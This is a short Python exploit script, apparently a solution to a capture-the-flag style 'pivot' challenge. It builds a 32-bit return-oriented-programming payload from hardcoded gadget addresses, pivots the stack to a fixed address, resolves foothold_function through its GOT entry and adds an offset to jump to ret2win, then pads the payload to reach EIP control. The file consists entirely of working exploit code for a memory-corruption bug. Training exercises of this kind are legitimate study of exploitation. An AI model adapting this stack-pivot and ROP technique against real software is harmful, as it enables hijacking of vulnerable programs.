import struct
import pdb

def stringpacker(addr):

    return str(struct.pack("<I",addr))

# foothold_function / ret2win addresses and offsets
foothold_function = 0x080485f0 # foothold_function@plt
#foothold_function = 0x080488a7
'''
 rabin2 -s libpivot32.so | grep -E "foothold_function|ret2win"
 addr=0x00000967 off=0x00000967 ord=053 fwd=NONE sz=46 bind=GLOBAL type=FUNC name=ret2win
 addr=0x00000770 off=0x00000770 ord=062 fwd=NONE sz=43 bind=GLOBAL type=FUNC name=foothold_function
'''
ret2win_function_offset = 0x967 - 0x770
foothold_function_got_plt = 0x804a024



# gadgets
pop_eax = 0x080488c0 # pop eax; ret
xchg_esp_eax = 0x080488c2 # xchg esp,eax; ret
mov_eax_ptreax = 0x080488c4 # mov eax, DWORD PTR [eax]; ret
add_eax_ebx = 0x080488c7 # add eax,ebx; ret
pop_ebx = 0x08048571 # pop ebx; ret
call_eax = 0x080486a3 # call eax

begin_payload = 0xf7dfcf08 # this is where our payload will be stored at


# step 0: stack pivot chain

stackpivotchain = ""
stackpivotchain += stringpacker(pop_eax)
stackpivotchain += stringpacker(begin_payload)
stackpivotchain += stringpacker(xchg_esp_eax)

# step 1: call foothold_function

ropchain = ""
ropchain += stringpacker(foothold_function)

# step 2: overwrite foothold function

ropchain += stringpacker(pop_eax)
ropchain += stringpacker(foothold_function_got_plt) # eax holds now the address of the foothold_function got plt entry
ropchain += stringpacker(mov_eax_ptreax) # eax contains now the contents of the foothold_function got plt entry
ropchain += stringpacker(pop_ebx) # ebx contains now the offset to the ret2win function
ropchain += stringpacker(ret2win_function_offset)
ropchain += stringpacker(add_eax_ebx) # eax contains now the final address to the ret2win function
ropchain += stringpacker(call_eax)

payload = ropchain
payload += (299 - len(ropchain)) *"B" # filler bytes to reach the point of EIP control
payload += stackpivotchain

print(payload)


